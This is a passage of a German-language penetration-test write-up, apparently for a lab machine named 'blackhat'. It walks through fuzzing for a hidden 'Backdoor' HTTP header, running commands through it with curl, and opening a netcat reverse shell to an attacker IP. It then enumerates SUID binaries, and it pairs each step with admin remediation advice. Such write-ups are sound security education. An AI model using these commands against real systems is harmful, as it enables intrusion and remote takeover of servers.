+                <br>**Empfehlung (Admin):** Überprüfen Sie die `disable_functions` Einstellung in der `php.ini` und deaktivieren Sie alle gefährlichen Funktionen, die nicht benötigt werden. Konfigurieren Sie `ffi.enable` restriktiv oder deaktivieren Sie FFI vollständig, wenn es nicht benötigt wird. Verhindern Sie das Hochladen von Dateien, die als PHP-Code oder als Bibliotheken interpretiert werden könnten (z.B. `.user.ini`, `.htaccess`, `.so`-Dateien).
+            </p>
+            <pre>
+PHP-Konfiguration: <span class="command">disable_functions</span> ist nicht perfekt
+
+Ich habe mir die disable_functions Liste in der phpinfo.php angesehen:
+disable_functions: <span class="command">pcntl_alarm,pcntl_fork, ... ,pcntl_exec, ...</span>
+
+Es sind zwar viele pcntl_ Funktionen deaktiviert, aber die wichtigsten Funktionen für
+eine Reverse Shell sind "NICHT" deaktiviert:
+
+    <span class="command">system</span>
+    <span class="command">shell_exec</span>
+    <span class="command">passthru</span>
+    <span class="command">exec</span> (Achtung, pcntl_exec ist deaktiviert, aber nicht exec selbst!)
+    <span class="command">proc_open</span>
+
+
+PHP-Konfiguration: <span class="command">FFI (Foreign Function Interface)</span>
+
+Unter dem Abschnitt FFI in der phpinfo.php steht:
+<span class="command">ffi.enable = preload</span>
+
+Das ist sehr interessant! PHP FFI kann, wenn es falsch konfiguriert ist, für RCE missbraucht werden.
+Die preload Einstellung bedeutet, dass PHP beim Start eine vom Entwickler definierte C-Bibliothek laden
+kann. Wenn wir irgendwie eine Datei auf den Server hochladen könnten (z.B. ein .user.ini), könnten wir
+PHP anweisen, unsere eigene bösartige .so-Datei zu laden. Das ist ein fortgeschrittener, aber sehr
+mächtiger Vektor.
+</pre>
+
+        </section>
+```
+
+**Teil 3 von 3**
+
+```html
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis">
+                **Analyse:** Aufbauend auf der Entdeckung des `mod_backdoor` Moduls und des Hinweises "check backdoor", teste ich nun, ob ein HTTP-Header namens "Backdoor" existiert und ob ich über ihn Befehle ausführen kann. Ich verwende `wfuzz` mit der Option `-H "FUZZ: id"`, um zu sehen, ob das Einfügen des Wortes "id" in einen Fuzzing-Placeholder im Header eine andere Antwort als die Standard-Antwort des Servers erzeugt (gefiltert mit `--hh 1437`, basierend auf der Content-Length der index.html). Der Fuzzing-Placeholder ist im Namen des Headers (`FUZZ`).
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Erfolg!** Wfuzz findet einen Treffer (ID 000181647) mit Status 200 und der Payload "Backdoor". Die Antwort hat nur 1 Zeile, 3 Wörter und 54 Zeichen, was sich stark von der Standardseite unterscheidet. Dies bestätigt, dass ein HTTP-Header namens "Backdoor" existiert und dass das Einfügen von "id" in seinen Wert eine Reaktion des Servers hervorruft. Dies ist der Mechanismus der Backdoor.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Verwenden Sie nun den gefundenen "Backdoor"-Header, um systematisch Befehle auszuführen und den ersten Zugriff zu erlangen.
+                <br>**Empfehlung (Admin):** **Dringend:** Entfernen Sie das `mod_backdoor` Modul und jegliche Logik, die Befehle über HTTP-Header ausführt. Überprüfen Sie alle benutzerdefinierten oder nicht-standardmäßigen Webserver-Module.
+            </p>
+            <p>
+                Fuzzing nach einem potenziellen Backdoor-Header:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "FUZZ: id" --hh 1437 http://blackhat.hmv/</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+
+<span class="command">000181647:   200        1 L      3 W        54 Ch       "Backdoor"</span>
+
+<span class="password">Total time: 0</span>
+<span class="password">Processed Requests: 220546</span>
+<span class="password">Filtered Requests: 218689</span>
+<span class="password">Requests/sec.: 0</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich nutze den gefundenen "Backdoor"-Header, um Befehle auf dem Zielsystem auszuführen. Ich sende eine `curl` Anfrage an die Root-URL und füge den Header `-H "Backdoor: id"` hinzu. Die Option `-s` unterdrückt Fortschrittsanzeigen von curl, `| tail -n 1` zeigt nur die letzte Zeile der Ausgabe, da die Backdoor wahrscheinlich nur den Output des Befehls in die Antwort einfügt. Ich führe den Befehl `id` aus, um die Identität des Benutzers zu prüfen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Fantastisch! Die Ausführung des `id`-Befehls war erfolgreich!** Der Output `uid=33(www-data) gid=33(www-data) groups=33(www-data)` bestätigt, dass ich beliebige Befehle auf dem System ausführen kann, und zwar mit den Rechten des Webserver-Benutzers `www-data`. Dies ist der entscheidende Schritt zum Initial Access – ich habe Remote Code Execution (RCE) erlangt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nutzen Sie diese RCE-Fähigkeit, um das System weiter zu enumerieren (Dateisystem, Benutzer, Prozesse) und eine stabilere Shell (z.B. Reverse Shell) zu etablieren.
+                <br>**Empfehlung (Admin):** **Sofortige Behebung:** Entfernen Sie das `mod_backdoor` Modul oder sichern Sie es extrem ab. Jegliche RCE-Schwachstelle ermöglicht die vollständige Kompromittierung des betroffenen Systems.
+            </p>
+            <p>
+                Ausnutzung der Backdoor über den HTTP-Header zur Ausführung des `id`-Befehls:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl http://blackhat.hmv/ -H "Backdoor: id" -s | tail -n 1</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Nachdem die RCE bestätigt ist, nutze ich den Backdoor-Header, um das Home-Verzeichnis zu listen (`ls /home`) und dann den Inhalt des Home-Verzeichnisses des Benutzers `darkdante` zu listen (`ls -la /home/darkdante`). Ich nutze weiterhin `curl` mit dem "Backdoor"-Header und `| tail -n 1` um die relevante Ausgabe zu extrahieren.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Befehl `ls /home` zeigt, dass es einen Benutzer namens `darkdante` gibt. Das Listing von `/home/darkdante` zeigt eine typische Verzeichnisstruktur (.bashrc, .profile, etc.) und am wichtigsten eine Datei namens `user.txt`. Dies ist sehr wahrscheinlich die Benutzer-Flag, die ich als nächstes Ziel ansteuere. Die Berechtigungen auf `user.txt` sind `-rwx------ 1 darkdante darkdante`, was bedeutet, dass nur der Benutzer `darkdante` die Datei lesen, schreiben und ausführen kann. Als `www-data` kann ich diese Datei nicht direkt lesen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Der Benutzer `darkdante` ist das offensichtliche Ziel für den ersten PrivEsc-Schritt. Finden Sie einen Weg, die Berechtigungen von `www-data` auf `darkdante` zu erhöhen oder Anmeldedaten für `darkdante` zu finden.
+                <br>**Empfehlung (Admin):** Setzen Sie restriktive Berechtigungen auf Benutzerdateien, insbesondere auf sensible Dateien wie Flags in CTF-Umgebungen. Home-Verzeichnisse sollten standardmäßig `chmod 700` haben.
+            </p>
+            <p>
+                Enumeration von Benutzern und dem Home-Verzeichnis von `darkdante` über die Backdoor:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl http://blackhat.hmv/ -H "Backdoor: ls /home" -s | tail -n 1</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">darkdante</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl http://blackhat.hmv/ -H "Backdoor: ls -la /home/darkdante" -s | tail -n 1</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">-rwx------ 1 darkdante darkdante   33 Nov 11  2022 user.txt</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich dokumentiere hier die clientseitigen Versuche, den Source Code der `index.html` Seite anzuzeigen. Der Text im Bericht beschreibt die Deaktivierung von JavaScript im Browser, um das von der Seite implementierte Blocking der Strg+U Tastenkombination zu umgehen. Anschließend wird das Kontextmenü durch Rechtsklick genutzt, um "Seitenquelltext anzeigen" auszuwählen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies illustriert eine einfache, aber effektive Methode, clientseitige Schutzmechanismen zu umgehen, die sich auf JavaScript verlassen. Das Blocking des Source Codes war nur eine oberflächliche Maßnahme. Die tatsächliche Schwachstelle (der "backdoor"-Hinweis) konnte so dennoch gefunden werden.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Verlassen Sie sich nie darauf, dass clientseitiges JavaScript Sicherheitsmaßnahmen durchsetzt. Lernen Sie, solche Beschränkungen (z.B. durch Deaktivieren von JS, Verwenden von Entwickler-Tools, oder eben `view-source:`) zu umgehen.
+                <br>**Empfehlung (Admin):** Implementieren Sie Sicherheitsmaßnahmen immer serverseitig. Clientseitiges JavaScript dient der Benutzerfreundlichkeit, nicht der Sicherheit vor Angreifern.
+            </p>
+            <img src="jsdeaktivieren_backdoor.jpg" alt="hier sieht man die deaktivierung von Javascript">
+            <p class="analysis">Bildbeschreibung: hier sieht man die deaktivierung von Javascript</p>
+            <img src="rechtsklick_code_ansehen.jpg" alt="hier sieht man die freilegung des sourcecodes durch rechtsklick">
+            <p class="analysis">Bildbeschreibung: hier sieht man die freilegung des sourcecodes durch rechtsklick</p>
+
+
+            <p class="analysis">
+                **Analyse:** Mit der RCE-Fähigkeit als `www-data` möchte ich eine stabilere interaktive Shell erhalten. Ich prüfe zunächst, ob das `nc` (Netcat) Binary auf dem Zielsystem verfügbar ist, indem ich `which nc` über den Backdoor-Header ausführe.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Befehl `which nc` gibt `/usr/bin/nc` zurück, was bedeutet, dass Netcat auf dem System installiert und im PATH des `www-data` Benutzers verfügbar ist. Netcat ist ein vielseitiges Tool, das sich hervorragend für den Aufbau von Reverse Shells eignet, insbesondere mit der `-e` Option zur Ausführung eines Binaries nach Verbindungsaufbau.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Prüfen Sie die Verfügbarkeit gängiger Binaries (`nc`, `python`, `python3`, `php`, `bash`, `sh`) auf einem kompromittierten System, um die Möglichkeiten für die Erlangung einer stabilen Shell zu bewerten.
+                <br>**Empfehlung (Admin):** Entfernen Sie unnötige Entwicklungstools und Netzwerk-Utilities wie Netcat von Produktionssystemen, falls sie nicht explizit benötigt werden.
+            </p>
+            <p>
+                Prüfen der Verfügbarkeit von Netcat über die Backdoor:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl http://blackhat.hmv/ -H "Backdoor: which nc" -s | tail -n 1</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">/usr/bin/nc</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Da Netcat verfügbar ist, versuche ich, eine Reverse Shell von der Zielmaschine (`blackhat.hmv`) zu meiner Angreifer-Maschine (`192.168.2.199`) auf Port 4444 zu initiieren. Ich nutze wieder den "Backdoor"-Header, um den Befehl `nc -e /bin/bash 192.168.2.199 4444` auszuführen. Dieser Befehl weist Netcat an, eine Verbindung zu meiner IP auf Port 4444 aufzubauen und `/bin/bash` an die eingehende Verbindung zu binden.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Befehl wurde abgesetzt. Die Tatsache, dass keine unmittelbare Fehlermeldung zurückkommt, deutet darauf hin, dass der Befehl wahrscheinlich erfolgreich ausgeführt wurde. Die Shell-Verbindung sollte nun auf meinem Listener ankommen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Vor dem Auslösen einer Reverse Shell immer zuerst einen Listener auf der Angreifer-Maschine einrichten. Gängige Reverse Shell Payloads für verschiedene Binaries und Protokolle (Netcat, Bash, Python, PHP, Perl, Ruby etc.) kennen.
+                <br>**Empfehlung (Admin):** Filtern Sie ausgehenden Netzwerkverkehr von Webservern und anderen Systemen, um Reverse Shells zu verhindern. Erlauben Sie nur notwendige ausgehende Verbindungen zu bekannten, sicheren Zielen.
+            </p>
+            <p>
+                Initiierung einer Reverse Shell von Blackhat zu meiner Maschine über die Backdoor:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">curl http://blackhat.hmv/ -H "Backdoor: nc -e /bin/bash 192.168.2.199 4444" -s | tail -n 1</span></div>
+                </div>
+                <div class="terminal">
+                    <pre></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Auf meiner Angreifer-Maschine (192.168.2.199) habe ich einen Netcat-Listener auf Port 4444 eingerichtet (`nc -lvnp 4444`), um die erwartete Reverse Shell zu empfangen. Der Output zeigt, dass eine eingehende Verbindung von der Ziel-IP (192.168.2.34) auf Port 4444 registriert wurde und erfolgreich eine Shell-Sitzung geöffnet wurde. Der erste Prompt auf dem Listener ist `www-data@blackhat:/$`. Ich führe den Befehl `id` aus, um meine Identität zu bestätigen, und `which python3`, um zu prüfen, ob Python 3 verfügbar ist.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Fantastisch! Der erste Zugriff war erfolgreich!** Ich habe eine interaktive Shell auf dem Zielsystem als Benutzer `www-data` erhalten. Der `id` Befehl bestätigt meine niedrigen Privilegien. Die Verfügbarkeit von Python 3 ist eine nützliche Information, da Python oft für Privilege Escalation Skripte verwendet werden kann. Ich habe nun eine stabile Basis auf dem System, um mit der lokalen Enumeration und der Suche nach Wegen zur Privilege Escalation fortzufahren.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Sammeln Sie sofort Systeminformationen. Überprüfen Sie Dateisystemberechtigungen, laufende Prozesse, installierte Software, Konfigurationsdateien und potenzielle Schwachstellen für Privilege Escalation (z.B. SUID-Binaries, Cronjobs, unsichere Berechtigungen, Kernel-Schwachstellen). Laden Sie Enumerations-Skripte wie `linpeas.sh` hoch.
+                <br>**Empfehlung (Admin):** **Erster Zugriff durch RCE:** Dies ist kritisch und erfordert sofortige Behebung der Backdoor. Überprüfen Sie außerdem Firewalls und Netzwerksegmentierung, um zu verhindern, dass Reverse Shells zu externen Hosts aufgebaut werden können.
+            </p>
+            <p>
+                Empfangen der Reverse Shell auf meiner Maschine und Bestätigung des ersten Zugriffs:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nc -lvnp 4444</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 4444 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.34] 35934</span>
+<span class="password">id</span>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+<span class="password">which python3</span>
+<span class="command">/usr/bin/python3</span>
+
+
+<span class="password">www-data@blackhat:/$</span>
+-----
+          
+<span class="password">www-data@blackhat:/tmp$</span>
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="proof-of-concept">
+             <h2>Proof of Concept: Remote Code Execution via Backdoor Header</h2>
+             <p class="comment">
+                Dieser Bereich demonstriert die Ausnutzung einer absichtlich eingebauten Backdoor, die über einen spezifischen HTTP-Header Remote Code Execution (RCE) als Webserver-Benutzer (`www-data`) ermöglichte. Dies führte zum ersten Zugriff auf das Zielsystem.
+             </p>
+             <h3>Kurzbeschreibung</h3>
+             <p>
+                Die Webanwendung enthält ein benutzerdefiniertes Apache-Modul namens `mod_backdoor`, das Befehle, die im Wert eines HTTP-Headers namens "Backdoor" gesendet werden, direkt auf dem System ausführt. Diese Schwachstelle erlaubt unauthentifizierten Angreifern, beliebige Systembefehle mit den Rechten des Webserver-Benutzers (`www-data`) auszuführen.
+             </p>
+             <h3>Voraussetzungen</h3>
+             <ul>
+                 <li>Zugriff auf das Netzwerk, in dem sich das Zielsystem befindet (192.168.2.0/24).</li>
+                 <li>Fähigkeit, angepasste HTTP GET-Anfragen an den Zielwebserver auf Port 80 zu senden.</li>
+                 <li>Kenntnis der Angreifer-IP-Adresse (hier 192.168.2.199).</li>
+                 <li>Eine Angreifer-Maschine mit Netcat oder einem ähnlichen Tool zum Einrichten eines TCP-Listeners.</li>
+             </ul>
+             <h3>Schritt-für-Schritt-Anleitung</h3>
+             <p class="analysis">
+                **Schritt 1: Identifizierung der Backdoor.**
+                Während der Web-Enumeration wurden Hinweise auf eine Backdoor gefunden: Ein Kommentar im HTML-Source Code der Startseite ("check backboor") und die Listung eines ungewöhnlichen Apache-Moduls (`mod_backdoor`) in der `phpinfo.php`.
+             </p>
+             <p class="analysis">
+                **Schritt 2: Entdeckung des Backdoor-Headers.**
+                Mittels Fuzzing wurde identifiziert, dass ein HTTP-Header namens "Backdoor" existiert und eine Reaktion des Servers hervorruft, wenn ein Wert zugewiesen wird.
+             </p>
+             <pre>
+<span class="command">wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "FUZZ: id" --hh 1437 http://blackhat.hmv/</span>
+</pre>
+            <p class="evaluation">
+                **Ergebnis von Schritt 2:**
+                Der Fuzzing-Output bestätigt den "Backdoor"-Header als gültig.
+            </p>
+            <pre>
+<span class="command">000181647:   200        1 L      3 W        54 Ch       "Backdoor"</span>
+</pre>
+
+             <p class="analysis">
+                **Schritt 3: Verifikation der Remote Code Execution.**
+                Es wird eine `curl` Anfrage gesendet, die den "Backdoor"-Header mit dem Wert `id` enthält.
+             </p>
+            <pre>
+<span class="command">curl http://blackhat.hmv/ -H "Backdoor: id" -s | tail -n 1</span>
+</pre>
+            <p class="evaluation">
+                **Ergebnis von Schritt 3:**
+                Die Ausgabe des `id`-Befehls (`uid=33(www-data) gid=33(www-data) groups=33(www-data)`) wird in der HTTP-Antwort zurückgegeben. Dies beweist erfolgreiche RCE als Benutzer `www-data`.
+            </p>
+            <pre>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+
+             <p class="analysis">
+                **Schritt 4: Vorbereitung des Listeners.**
+                Auf der Angreifer-Maschine wird ein Netcat-Listener auf Port 4444 gestartet, um die Reverse Shell zu empfangen.
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nc -lvnp 4444</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 4444 ...</span>
+</pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                **Schritt 5: Auslösen der Reverse Shell.**
+                Der "Backdoor"-Header wird erneut genutzt, um einen Befehl auszuführen, der eine Reverse Shell zu unserem Netcat-Listener auf 192.168.2.199 auf Port 4444 initiiert (`nc -e /bin/bash 192.168.2.199 4444`).
+             </p>
+             <pre>
+<span class="command">curl http://blackhat.hmv/ -H "Backdoor: nc -e /bin/bash 192.168.2.199 4444" -s | tail -n 1</span>
+</pre>
+
+             <h3>Erwartetes Ergebnis</h3>
+             <p>
+                Der Netcat-Listener auf der Angreifer-Maschine sollte eine eingehende Verbindung vom Zielsystem (192.168.2.34) auf Port 4444 registrieren und eine interaktive Shell als Benutzer `www-data` bereitstellen.
+             </p>
+             <h3>Beweismittel</h3>
+             <p class="evaluation">
+                Der Output des Netcat-Listeners zeigt die eingehende Verbindung und den `www-data` Shell-Prompt, was den erfolgreichen ersten Zugriff belegt.
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nc -lvnp 4444</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 4444 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.34] 35934</span>
+<span class="password">id</span>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+<span class="password">which python3</span>
+<span class="command">/usr/bin/python3</span>
+
+
+<span class="password">www-data@blackhat:/$</span>
+-----
+          
+<span class="password">www-data@blackhat:/tmp$</span>
+</pre>
+                </div>
+            </div>
+
+            <h3>Risikobewertung</h3>
+            <p class="evaluation">
+                **Kritisch:** Diese Backdoor ermöglicht unauthentifizierten RCE, was zur vollständigen Kompromittierung des Webservers und potenziellen weiteren Angriffen führen kann. Dies ist eine der schwerwiegendsten Schwachstellen.
+            </p>
+            <h3>Empfehlungen</h3>
+            <ul>
+                <li>**Sofortige Entfernung:** Das `mod_backdoor` Modul muss umgehend vom System entfernt werden.</li>
+                <li>**Code Review:** Führen Sie einen umfassenden Code-Review der Webanwendung und aller benutzerdefinierten Module durch, um versteckte oder unsichere Funktionalitäten zu identifizieren.</li>
+                <li>**Principle of Least Privilege:** Sicherstellen, dass der Webserver-Prozess mit minimalen Rechten läuft, um den Schaden im Falle einer Kompromittierung zu begrenzen.</li>
+                <li>**Firewall:** Beschränken Sie ausgehenden Netzwerkverkehr vom Webserver auf das absolut Notwendige.</li>
+            </ul>
+        </section>
+
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis">
+                **Analyse:** Nachdem ich eine interaktive Shell als `www-data` erhalten habe, beginne ich mit der Enumeration des Systems, um Möglichkeiten zur Privilege Escalation (PE) zu finden. Ich suche nach SUID-Binaries (`find / -type f -perm -4000 -ls 2>/dev/null`), die es einem normalen Benutzer erlauben, sie mit den Rechten des Dateibesitzers (oft root) auszuführen. Die Ausgabe listet mehrere solcher Binaries auf.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Liste enthält standardmäßige SUID-Binaries wie `su`, `passwd`, `mount`, `sudo`, `gpasswd` usw. Diese sind auf den meisten Linux-Systemen vorhanden. `sudo` ist oft ein Ansatzpunkt, wenn die Konfiguration es erlaubt, bestimmte Befehle als Root auszuführen. Andere Binaries können bekannte Exploits haben oder für ungewöhnliche Konfigurationen genutzt werden. Ich werde diese Liste als Referenz für potenzielle PE-Vektoren behalten.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Untersuchen Sie jedes gefundene SUID-Binary auf bekannte Schwachstellen oder ungewöhnliches Verhalten. Prüfen Sie die `sudo` Konfiguration (`sudo -l`) als nächsten Schritt.
+                <br>**Empfehlung (Admin):** Minimieren Sie die Anzahl der Binaries mit gesetztem SUID-Bit. Überprüfen und patchen Sie regelmäßig Binaries, die bekanntermaßen anfällig sind (obwohl die hier gelisteten standardmäßig relativ sicher sind, wenn richtig konfiguriert).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@blackhat:/$ <span class="command">find / -type f -perm -4000 -ls 2&gt;/dev/null</span>
+   <span class="command">133541     72 -rwsr-xr-x   1 root     root        71912 Jan 20  2022 /usr/bin/su</span>
+   <span class="command">129888     64 -rwsr-xr-x   1 root     root        63960 Feb  7  2020 /usr/bin/passwd</span>
+   <span class="command">133908     56 -rwsr-xr-x   1 root     root        55528 Jan 20  2022 /usr/bin/mount</span>
+   <span class="command">129884     60 -rwsr-xr-x   1 root     root        58416 Feb  7  2020 /usr/bin/chfn</span>
+   <span class="command">133910     36 -rwsr-xr-x   1 root     root        35040 Jan 20  2022 /usr/bin/umount</span>
+   <span class="command">163353    180 -rwsr-xr-x   1 root     root       182600 Feb 27  2021 /usr/bin/sudo</span>
+   <span class="command">129887     88 -rwsr-xr-x   1 root     root        88304 Feb  7  2020 /usr/bin/gpasswd</span>
+   <span class="command">129885     52 -rwsr-xr-x   1 root     root        52880 Feb  7  2020 /usr/bin/chsh</span>
+   <span class="command">133382     44 -rwsr-xr-x   1 root     root        44632 Feb  7  2020 /usr/bin/newgrp</span>
+   <span class="command">266985     52 -rwsr-xr--   1 root     messagebus    51336 Oct  5  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+   <span class="command">147507    472 -rwsr-xr-x   1 root     root         481608 Jul  2  2022 /usr/lib/openssh/ssh-keysign</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich setze meine System-Enumeration fort. Ich überprüfe die offenen Netzwerkverbindungen mit `ss -altpn`, um laufende Dienste zu sehen. Dann überprüfe ich die Dateisystemberechtigungen für die kritischen Systemdateien `/etc/passwd` und `/etc/shadow` mit `ls -la`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Ausgabe von `ss` zeigt, dass als `www-data` nur der Webserver auf Port 80 offen ist. Es gibt keine ungewöhnlichen offenen Ports, die auf interne Dienste hindeuten, die von `www-data` erreicht werden könnten. Die Berechtigungen von `/etc/passwd` (`-rw-r--r--`) erlauben `www-data` das Lesen der Datei, was für die Benutzer-Enumeration nützlich ist (wie wir zuvor über die Backdoor getan haben). Die Berechtigungen von `/etc/shadow` (`-rw-r-----`) erlauben `www-data` *nicht* das Lesen, da die Datei nur für Root und die Gruppe `shadow` lesbar ist. Dies verhindert das einfache Auslesen von Passwort-Hashes.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Sammeln Sie immer Informationen über laufende Dienste und Dateiberechtigungen auf kritischen Systemdateien. Das Lesen von `/etc/passwd` ist ein Standard-Enumerationsschritt.
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass `/etc/shadow` nur für Root lesbar ist. Überprüfen Sie die Berechtigungen anderer sensibler Konfigurationsdateien.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@blackhat:/$ <span class="command">ss -altpn</span>
+<span class="command">State     Recv-Q    Send-Q         Local Address:Port         Peer Address:Port    Process    </span>
+<span class="command">LISTEN    0         511                        *:80                      *:*</span>
+<span class="password">www-data@blackhat:/$</span>
+www-data@blackhat:/$ <span class="command">ls -la /etc/passwd</span>
+<span class="command">-rw-r--r-- 1 root root 1482 Nov 11  2022 /etc/passwd</span>
+www-data@blackhat:/$ <span class="command">ls -la /etc/shadow</span>
+<span class="command">-rw-r----- 1 root shadow 840 Nov 19  2022 /etc/shadow</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich wechsle in das Home-Verzeichnis des Benutzers `darkdante` (`/home/darkdante`) und liste den Inhalt mit detaillierten Berechtigungen auf (`ls -la`).
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Listing bestätigt das Home-Verzeichnis von `darkdante`. Alle Dateien und Verzeichnisse gehören dem Benutzer `darkdante`. Die Berechtigungen sind für `www-data` (als "other") auf Verzeichnisse `drwxr-xr-x` und Dateien `rw-r--r--` oder `rwx------` beschränkt. Wichtiger ist die Datei `user.txt` mit Berechtigungen `-rwx------`. Diese Berechtigung bedeutet, dass *nur* der Benutzer `darkdante` diese Datei lesen, schreiben und ausführen kann. Als `www-data` habe ich keinen Zugriff darauf. Der Symlink `.bash_history -> /dev/null` ist interessant, verhindert aber nur das Speichern von Befehlen, keine direkte Schwachstelle.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Da die `user.txt` für `www-data` nicht lesbar ist, muss ich auf den Benutzer `darkdante` eskalieren, um die Flag zu erhalten. Der Fokus liegt auf der Kompromittierung des `darkdante` Accounts.
+                <br>**Empfehlung (Admin):** Stellen Sie sicher, dass sensible Dateien in Home-Verzeichnissen nur für den Eigentümer lesbar sind (`chmod 600`). Überprüfen Sie symbolische Links, um sicherzustellen, dass sie nicht auf kritische Systemdateien verweisen, die dann unbeabsichtigt zugänglich werden.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@blackhat:/home/darkdante$ <span class="command">ls -la</span>
+<span class="command">total 28</span>
+<span class="command">drwxr-xr-x 3 darkdante darkdante 4096 Nov 13  2022 .</span>
+<span class="command">drwxr-xr-x 3 root      root      4096 Nov 11  2022 ..</span>
+<span class="command">lrwxrwxrwx 1 root      root         9 Nov 11  2022 .bash_history -&gt; /dev/null</span>
+<span class="command">-rw-r--r-- 1 darkdante darkdante  220 Nov 11  2022 .bash_logout</span>
+<span class="command">-rw-r--r-- 1 darkdante darkdante 3526 Nov 11  2022 .bashrc</span>
+<span class="command">drwxr-xr-x 3 darkdante darkdante 4096 Nov 11  2022 .local</span>
+<span class="command">-rw-r--r-- 1 darkdante darkdante  807 Nov 11  2022 .profile</span>
+<span class="command">-rwx------ 1 darkdante darkdante   33 Nov 11  2022 user.txt</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich prüfe die OS-Version, indem ich den Inhalt von Dateien im `/etc/` Verzeichnis lese, deren Namen "release" enthalten (`cat /etc/*leas*`). Dies gibt Informationen über die installierte Distribution und Version. Ich dokumentiere auch den seltsamen `.bash_history` Symlink, den ich im Home-Verzeichnis von `darkdante` gefunden habe. Im Originaltext wird angemerkt, dass dieser Pfad und eine Überlegung bezüglich einer Race Condition in `/tmp` Sackgassen waren.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Ausgabe `PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"` bestätigt, dass das System Debian 11 ("bullseye") ist. Diese Information ist sehr wichtig für die Recherche nach Kernel-Exploits oder Paket-spezifischen Schwachstellen. Die Notiz über Sackgassen und die Race Condition Überlegung ist wertvoll für die Dokumentation des tatsächlichen Testverlaufs – nicht jeder getestete Weg führt zum Ziel. Der Symlink `.bash_history -> /dev/null` bedeutet, dass die Bash-History für diesen Benutzer nicht gespeichert wird.
+            </p>
+            <p class="recommendation">
